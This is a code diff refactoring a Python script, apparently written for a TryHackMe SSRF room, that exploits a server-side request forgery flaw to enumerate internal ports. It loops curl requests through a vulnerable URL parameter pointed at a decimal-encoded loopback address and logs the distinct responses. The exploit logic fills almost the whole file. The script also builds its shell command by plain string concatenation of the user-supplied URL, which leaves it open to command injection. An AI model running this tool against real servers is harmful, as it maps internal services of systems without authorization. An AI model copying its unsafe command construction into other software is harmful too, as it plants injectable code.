@@ -1,11 +1,11 @@
 #!/bin/python3
+
 import sys
 import subprocess
+import argparse
 
 #TEST: https://tryhackme.com/room/ssrf
-#Example: 
-
-number_of_arguments = len(sys.argv) - 1
+#Example: python3 ssrf_port_enum.py -p 1 1000 -f "results.txt" "http://10.10.189.241:8000/attack?url=http://2130706433:"
 
 class response(object):
 	def __init__(self, response, port):
@@ -19,18 +19,13 @@ class response(object):
 		self.occurences += 1
 		self.ports.append(port)
 
-def show_help():
-	print('\nTemplate: python3 ssrf_port_enum.py <url> [first_port] [last_port] [filename]\n')
-	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:"')
-	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000')
-	print('Example:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:" 1 1000 results.txt\n')
+def show_description():
+	print("""Enumerating ports for ssrf vulnerable web application\n
+Examples:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:"
+           python3 ssrf_port_enum.py -p 1 1000 "http://10.10.189.241:8000/attack?url=http://2130706433:"
+	   python3 ssrf_port_enum.py -p 1 1000 -f "results.txt" "http://10.10.189.241:8000/attack?url=http://2130706433:"\n\n""")
 
-def save_to_file(responses):
-	if number_of_arguments == 4:
-		filename = str(sys.argv[4])
-	else:
-		filename = "ssrf_enum_result.txt"
-	
+def save_to_file(responses, filename):
 	with open(filename, "w") as f:
 		f.write("SCAN RESULTS\n\n")
 		f.write("-"*200 + "\n")
@@ -44,30 +39,16 @@ def save_to_file(responses):
 			f.write(f"\nNumber of occurences: {str(r.occurences)}\n")
 			f.write("\n" + "-"*200 + "\n")
 	
-	print('Result saved to file: ' + filename)
+	print('Results saved to file: ' + filename)
 
-def enumerate_ports():
-	url = str(sys.argv[1])
+def enumerate_ports(url, first_port, last_port):
 	responses = []
 	
-	print('URL: ' + url + 'PORT')
-	
-	if number_of_arguments == 2:
-		print('Last port number is needed too!')
-		show_help()
-		sys.exit()
-	
-	if number_of_arguments > 2:
-		range_min = int(sys.argv[2])
-		range_max = int(sys.argv[3])
-	else:
-		range_min = 1
-		range_max = 65535
-	
-	print('Scan port range: ' + str(range_min) + '-' + str(range_max))
+	print('URL: ' + url + 'PORT')	
+	print('Scan port range: ' + str(first_port) + '-' + str(last_port))
 	
 	#scanning
-	for x in range(range_min, range_max+1):
+	for x in range(first_port, last_port + 1):
 		r = subprocess.getoutput("curl -s " + url + str(x))
 		
 		#for timeouts
@@ -96,17 +77,29 @@ def enumerate_ports():
 	return responses
 
 def main():
-	if number_of_arguments > 0 and number_of_arguments < 5:
-		try:
-			responses = enumerate_ports()
-			save_to_file(responses)
-		except Exception as e:
-			print('Error: ' + str(e))
-			print('Script terminated!')
+	try:
+		parser = argparse.ArgumentParser(description=show_description())
+		parser.add_argument('URL', type=str,
+			help='url which contains ssrf vulnerability')
+		parser.add_argument('-p', '--port', type=int, nargs=2, default=[0, 65535],
+			help='port range to scan (first_port last_port)')
+		parser.add_argument('-f', '--filename', type=str, default='ssrf_enum_result.txt',
+			help='name of file to which one will be saved scan results, default it is ssrf_enum_result.txt')
+		args = parser.parse_args()
 		
-	else:
-		print('Wrong number of arguments!\n')
-		show_help()
+		url = args.URL
+		first_port = args.port[0]
+		last_port = args.port[1]
+		filename = args.filename
+		
+		if first_port > last_port or first_port > 65535 or first_port < 0 or last_port > 65535 or last_port < 0:
+			raise ValueError("Wrong port numbers!")
+		
+		responses = enumerate_ports(url, first_port, last_port)
+		save_to_file(responses, filename)
+	except Exception as e:
+		print('Error: ' + str(e))
+		print('Script terminated!')
 
 
 main()
